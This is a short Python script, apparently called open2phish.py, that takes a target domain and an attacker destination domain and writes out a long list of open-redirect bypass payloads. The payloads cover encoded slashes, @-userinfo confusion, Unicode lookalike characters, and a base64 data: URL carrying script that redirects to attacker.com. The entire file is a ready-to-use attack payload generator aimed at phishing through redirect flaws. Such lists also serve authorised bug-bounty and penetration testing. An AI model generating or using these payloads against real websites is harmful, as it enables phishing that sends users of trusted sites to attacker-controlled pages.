#!/usr/bin/env python3

import argparse
from sys import argv

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="target domain (exp: target.com)", type=str)
parser.add_argument("-d", "--destination", help="Wanted destination domain (exp: attacker.com or xxx.oastify.com)", type=str)
args = parser.parse_args()

def domainSplit(dest):
	name, extension = dest.rsplit('.',1)
	return name, extension

def main():

	if len(argv) < 5:
		print('usage: python3 open2phish.py -t target.com -d attacker.com')
		exit(0)


	target=args.target
	dest=args.destination
	dest2, ext = domainSplit(dest)

	payloads=f"""
http://{dest}
https://{dest}
{dest}
.{dest}
//{dest}
///{dest}/%2F
////{dest}/%2F
https://{dest}/{target}
https://{target}.{dest}/{target}
https://{target}@{dest}/{target}
https:{dest}
https;{dest}
https:/\/\{dest}
https:\/\/{dest}
https:\\{dest}
https://{target}\@{dest}
//{dest2},{ext}
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9hdHRhY2tlci5jb20iPC9zY3JpcHQ+
https://{target}%2f@{dest}
https://{target}%252f@{dest}
https://{target}%25252f@{dest}
https://{target}%252f@{dest}
https://{dest}%ff{target}
https://{dest}?.{target}
https://{dest2}%e3%80%82{ext}
https://{dest2}。{ext}
https://{dest2}%02{ext}
%2f%2f{dest2}%25e3%2580%2582{ext}
//.@.@{dest}
//{target}@{dest}/%2f..
///{dest}/%2f..
///{target}@{dest}/%2f..
////{dest}/%2f..
////{target}@{dest}/%2f..
https://{dest}/%2f..
https://{target}@{dest}/%2f..
/https://{dest}/%2f..
/https://{target}@{dest}/%2f..
//{dest}/%2f%2e%2e
//{target}@{dest}/%2f%2e%2e
///{dest}/%2f%2e%2e
///{target}@{dest}/%2f%2e%2e
////{dest}/%2f%2e%2e
////{target}@{dest}/%2f%2e%2e
https://{dest}/%2f%2e%2e
https://{target}@{dest}/%2f%2e%2e
/https://{dest}/%2f%2e%2e
/https://{target}@{dest}/%2f%2e%2e
//{dest}/
//{target}@{dest}/
///{dest}/
///{target}@{dest}/
////{dest}/
////{target}@{dest}/
https://{dest}/
https://{target}@{dest}/
/https://{dest}/
/https://{target}@{dest}/
//{dest}//
//{target}@{dest}//
///{dest}//
///{target}@{dest}//
////{dest}//
////{target}@{dest}//
https://{dest}//
https://{target}@{dest}//
//https://{dest}//
//https://{target}@{dest}//
//{dest}/%2e%2e%2f
//{target}@{dest}/%2e%2e%2f
///{dest}/%2e%2e%2f
///{target}@{dest}/%2e%2e%2f
////{dest}/%2e%2e%2f
////{target}@{dest}/%2e%2e%2f
https://{dest}/%2e%2e%2f
https://{target}@{dest}/%2e%2e%2f
//https://{dest}/%2e%2e%2f
//https://{target}@{dest}/%2e%2e%2f
///{dest}/%2e%2e
///{target}@{dest}/%2e%2e
////{dest}/%2e%2e
////{target}@{dest}/%2e%2e
https:///{dest}/%2e%2e
https:///{target}@{dest}/%2e%2e
//https:///{dest}/%2e%2e
//{target}@https:///{dest}/%2e%2e
/https://{dest}/%2e%2e
/https://{target}@{dest}/%2e%2e
///{dest}/%2f%2e%2e
///{target}@{dest}/%2f%2e%2e
////{dest}/%2f%2e%2e
////{target}@{dest}/%2f%2e%2e
https:///{dest}/%2f%2e%2e
https:///{target}@{dest}/%2f%2e%2e
/https://{dest}/%2f%2e%2e
/https://{target}@{dest}/%2f%2e%2e
/https:///{dest}/%2f%2e%2e
/https:///{target}@{dest}/%2f%2e%2e
/%09/{dest}
/%09/{target}@{dest}
//%09/{dest}
//%09/{target}@{dest}
///%09/{dest}
///%09/{target}@{dest}
////%09/{dest}
////%09/{target}@{dest}
https://%09/{dest}
https://%09/{target}@{dest}
/%5c{dest}
/%5c{target}@{dest}
//%5c{dest}
//%5c{target}@{dest}
///%5c{dest}
///%5c{target}@{dest}
////%5c{dest}
////%5c{target}@{dest}
https://%5c{dest}
https://%5c{target}@{dest}
/https://%5c{dest}
/https://%5c{target}@{dest}
https://{target}@{dest}
//{dest2}%E3%80%82{ext}
\/\/{dest}/
/\/{dest}/
//{dest2}%00.{ext}
https://{target}/https://{dest}/
〱{dest}
〵{dest}
ゝ{dest}
ー{dest}
ｰ{dest}
/〱{dest}
/〵{dest}
/ゝ{dest}
/ー{dest}
/ｰ{dest}
<>//{dest}
//{dest}\@{target}
https://:@{dest}\@{target}
http://{dest}:80#@{target}/
http://{dest}:80?@{target}/
http://{target}+&@{dest}#+@{target}/
http://{dest}%0D{target}/
//{dest}:80#@{target}/
//{dest}:80?@{target}/
//{target}+&@{dest}#+@{target}/
//{dest}%0D{target}/
//;@{dest}
http://;@{dest}
http://{dest}%2f%2f.{target}/
http://{dest}%5c%5c.{target}/
http://{dest}%3F.{target}/
http://{dest}%23.{target}/
http://{target}:80%40{dest}/
http://{target}%2e{dest}/
/https:/%5c{dest}/
/http://{dest}
/%2f%2f{dest}
/{dest}/%2f%2e%2e
/http:/{dest}
/http:{dest}
/.{dest}
///\;@{dest}
/////{dest}/
/////{dest}
"""

	print(payloads)
	
	file = dest2+'.txt'
	output = open(file, "w")
	output.write(payloads)
	output.close()

main()
